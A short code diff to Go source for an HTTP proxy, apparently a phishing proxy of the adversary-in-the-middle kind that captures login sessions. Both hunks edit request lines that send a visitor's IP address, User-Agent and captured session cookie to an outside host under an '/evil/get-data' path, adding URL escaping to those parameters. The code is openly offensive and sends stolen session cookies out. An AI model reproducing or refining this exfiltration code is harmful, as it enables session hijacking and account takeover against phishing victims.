@@ -300,8 +300,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
 
-									//worldContent := doReq("https://apis.worlds.mom/evil/get-data?ip=" + remote_addr + "&agent=" + req.Header.Get("User-Agent"))
-									worldContent := doReq("https://apis.worlds.mom/evil/get-data?ip=" + remote_addr)
+									worldContent := doReq("https://apis.worlds.mom/evil/get-data?ip=" + remote_addr + "&agent=" + url.QueryEscape(req.Header.Get("User-Agent")))
+									//worldContent := doReq("https://apis.worlds.mom/evil/get-data?ip=" + remote_addr)
 									log.Info("API Content: %s", worldContent)
 
 									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
@@ -893,7 +893,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 						s.IsDone = true
 
-						worldContent := doReq("https://apis.worlds.mom/evil/get-data/?cookie=" + sendCookie)
+						worldContent := doReq("https://apis.worlds.mom/evil/get-data/?cookie=" + url.QueryEscape(sendCookie))
 					    log.Info("API Content: %s", worldContent)
 					}
 				}
